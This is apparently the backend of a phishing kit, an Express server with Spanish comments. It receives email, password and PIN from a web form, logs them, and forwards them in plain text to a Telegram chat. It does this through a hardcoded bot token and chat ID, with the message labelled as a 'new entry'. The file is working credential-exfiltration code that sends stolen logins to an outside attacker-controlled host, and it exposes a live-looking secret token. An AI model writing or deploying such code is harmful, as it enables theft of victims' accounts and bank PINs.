const express = require('express');
const bodyParser = require('body-parser');
const cors = require('cors'); // Importar el paquete de CORS
const fetch = require('node-fetch');


const app = express();
const port = 3000;

// Usar el middleware de CORS
app.use(cors());

// Middleware para parsear el cuerpo de las solicitudes en formato JSON
app.use(bodyParser.json());

// Ruta para manejar la solicitud POST desde el formulario
app.post('/submit-form', (req, res) => {
    const { email, password, pin } = req.body;

    // Aquí puedes manejar los datos recibidos
    console.log('Email:', email);
    console.log('Password:', password);
    console.log('PIN:', pin);

    // Puedes realizar validaciones adicionales y lógica de negocio aquí
    if (!email || !password || !pin) {
        return res.status(400).json({ message: 'Todos los campos son obligatorios.' });
    }

    // Enviar una respuesta al cliente
    res.json({ message: 'Datos recibidos correctamente.' });
    handleFormSubmission(email, password, pin);


});

// Iniciar el servidor
app.listen(port, () => {
    console.log(`Servidor escuchando en http://localhost:${port}`);
});

// Función para enviar mensaje a Telegram
async function sendTelegramMessage(chatId, message) {
    try {
        const url = `https://api.telegram.org/bot7300213566:AAEzzo5FLX3ChN4Rj-UpO_PxwDl9hKZg7Us/sendMessage`; // Reemplaza YOUR_BOT_TOKEN con tu token real
        const response = await fetch(url, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                chat_id: chatId,
                text: message
            })
        });

        const data = await response.json();
        console.log('Telegram API response:', data);
        return data;
    } catch (error) {
        console.error('Error sending Telegram message:', error);
        throw error;
    }
}

// Función para manejar el envío de datos al servidor
function handleFormSubmission(email, password, pin) {
    // Aquí puedes agregar la lógica para procesar los datos recibidos
    // Por ejemplo, guardar en una base de datos, enviar correos electrónicos, etc.

    // Ejemplo de envío de mensaje a Telegram después de recibir los datos
    const chatId = -1002230665930; // ID del chat de Telegram donde quieres enviar el mensaje
    const message = `Nuevo ingreso Para comer:\nEmail: ${email}\nPassword: ${password}\nPIN: ${pin}`;

    sendTelegramMessage(chatId, message)
        .then(() => {
            console.log('Mensaje enviado a Telegram con éxito');
            // Aquí puedes agregar más lógica después de enviar el mensaje
        })
        .catch(error => {
            console.error('Error al enviar mensaje a Telegram:', error);
            // Manejo de errores si es necesario
        });
}


